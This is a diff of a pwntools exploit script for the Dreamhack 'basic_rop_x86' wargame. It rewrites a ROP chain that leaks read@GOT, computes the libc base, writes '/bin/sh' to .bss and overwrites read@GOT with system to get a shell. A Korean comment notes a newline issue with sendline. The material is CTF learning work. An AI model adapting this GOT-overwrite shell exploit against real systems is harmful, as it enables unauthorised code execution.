@@ -4,48 +4,70 @@ import pwn
 
 pwn.context.log_level = 'debug'
 
-p = pwn.process("/tmp/basic_rop_x86")
-#p = pwn.remote("host1.dreamhack.games", 10079)
+#p = pwn.process("/tmp/basic_rop_x86")
+p = pwn.remote("host1.dreamhack.games", 11044)
 elf = pwn.ELF("/tmp/basic_rop_x86")
-libc = elf.libc
-rop = pwn.ROP(elf)
 
-rop.write(1,elf.got["read"],4)
-rop.read(0, elf.bss(), 8)
-rop.read(0, elf.got["read"], 4)
+writePlt = 0x8048450
+readGot = 0x804a00c
+readPlt = 0x80483f0
+p3r = 0x8048689
 
-print("\n====================ROP Payload====================")
-pwn.log.info(rop.dump())
+buf = b"A"*0x40
+padding = buf + b"A"*0x8
 
-padding = b"A"*0x48
 payload = padding
-payload += rop.chain()
+payload += pwn.p32(writePlt)
+payload += pwn.p32(p3r)
+payload += pwn.p32(0x1)
+payload += pwn.p32(readGot)
+payload += pwn.p32(0x4)
+payload += pwn.p32(readPlt)
+payload += pwn.p32(p3r)
+payload += pwn.p32(0x0)
+payload += pwn.p32(elf.bss())
+payload += pwn.p32(0x8)
+payload += pwn.p32(readPlt)
+payload += pwn.p32(p3r)
+payload += pwn.p32(0x0)
+payload += pwn.p32(readGot)
+payload += pwn.p32(0x4)
+payload += pwn.p32(writePlt)
+payload += pwn.p32(p3r)
+payload += pwn.p32(0x1)
+payload += pwn.p32(readGot)
+payload += pwn.p32(0x4)
+payload += pwn.p32(readPlt)
+payload += pwn.p32(0xdeadbeef)
+payload += pwn.p32(elf.bss())
 
-pwn.log.info("Sending payload. . .")
+
+pwn.log.info("Send payload")
 p.sendline(payload)
 
-p.recv(0x40)
-read_addr = pwn.u32(p.recv(4))
-print("\n====================Read function Address====================")
-tmp = hex(read_addr)
-pwn.log.info("Address: " + tmp)
+p.recv(64)
+readFunc = pwn.u32(p.recv(4))
+pwn.log.info("Read Function Address: " + hex(readFunc))
 
-read_offset = 0xd4350
-libc_base = read_addr - read_offset
-print("\n====================LIBC Base Address====================")
-pwn.log.info("Address: " + hex(libc_base))
+readOffset = 0xd4350
+libcBase = readFunc - readOffset
+pwn.log.info("LIBC Base Address: " + hex(libcBase))
 
-system_addr = libc_base + 0x3a940
-print("\n====================System function Address====================")
-pwn.log.info("Address: " + hex(system_addr))
+pwn.log.info("Send /bin/sh At " + hex(elf.bss()))
+p.send("/bin/sh\x00")
 
-print("\n====================Set bss section====================")
-pwn.log.info("Send /bin/sh")
-p.sendline("/bin/sh"+"\x00")
+systemOffset = 0x3a940
+systemAddr = libcBase + systemOffset
+pwn.log.info("System Address: " + hex(systemAddr))
 
-print("\n====================Change read got to system function====================")
-pwn.log.info("send system function address. . .")
-p.sendline(pwn.p32(system_addr))
+pwn.log.info("Spoof read GOT...")
+p.send(pwn.p32(systemAddr))
 
-print("\n====================Call system function====================")
+pwn.log.info("Spoofed read function GOT: " + hex(pwn.u32(p.recv(4))))
+
+pwn.log.info("Call spoofed read function...")
 p.interactive()
+
+"""
+\x0a와 관련하여 무언가 에러가 있는 것 같다. bss 영역에 값을 저장할 때와 system 함수를 호출할 때 sendline을 사용하면 제대로 동작하지 않는다.
+"""
